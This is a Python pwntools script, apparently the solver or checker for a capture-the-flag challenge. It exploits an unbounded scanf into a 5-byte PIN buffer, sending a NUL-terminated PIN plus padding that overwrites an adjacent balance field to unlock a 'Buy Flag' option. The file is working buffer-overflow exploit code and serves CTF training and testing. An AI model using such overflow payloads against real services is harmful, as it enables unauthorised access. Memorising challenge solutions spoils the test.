import os

from pwn import context, remote

context.log_level = "info"

HOST = os.environ.get("SERVICE_WATERMELON_SHOP_SHELL_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_WATERMELON_SHOP_SHELL_PORT", "1337"))

# Adapted from the challenge's own checker/exploit.py (author-provided).
#
# struct card_info_t { char number[20]; char pin[5]; uint64_t balance; };
# scanf("%s", card_info.pin) has no length bound, so writing
# "4267\x00" + padding overflows straight past the 5-byte pin buffer into
# the adjacent balance field (the embedded NUL still makes strcmp() see
# just "4267", so the PIN check itself passes). Overwriting balance with
# arbitrary attacker-controlled bytes trivially satisfies the
# `balance >= 13620000` check gating the "Buy Flag" option, which prints
# the flag directly -- no shell/ROP needed at all.

p = remote(HOST, PORT)
p.sendlineafter(b"> ", b"2")
p.sendafter(b"PIN: ", b"4267\x00" + b"A" * 30 + b"\n")

out = p.recvuntil(b"\n", timeout=15).decode(errors="replace")
print(out)
p.close()

flag_env = os.environ.get("flag_flag")
if flag_env and flag_env not in out:
    raise SystemExit(f"flag mismatch: expected {flag_env!r} to be in {out!r}")
